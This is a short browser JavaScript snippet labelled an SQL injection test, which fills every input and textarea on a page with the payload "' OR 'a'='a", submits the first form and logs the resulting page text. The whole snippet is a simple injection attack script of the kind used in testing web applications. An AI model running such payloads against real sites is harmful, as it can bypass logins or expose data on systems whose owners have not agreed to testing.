(function () {
  // Make sure script runs only once per page load
  if (window.hasRunSQLTest) return;
  window.hasRunSQLTest = true;

  console.log("SQL Injection test started...");

  const sqlPayloads = [
    "' OR 'a'='a"
  ];

  const formInputs = document.querySelectorAll('input, textarea');
  formInputs.forEach(input => {
    input.value = sqlPayloads[0];
    console.log(`Injected payload into input: ${input.name || input.id || 'unnamed input'}`);
  });

  const form = document.querySelector('form');
  if (form) {
    setTimeout(() => {
      console.log("Submitting form...");
      form.submit();
    }, 1000); // Give the browser some time to render before submitting
  }

  // Optional: log page content after it reloads
  window.addEventListener('load', () => {
    setTimeout(() => {
      console.log("Page content after reload:");
      console.log(document.body.innerText);
    }, 1000);
  });
})();
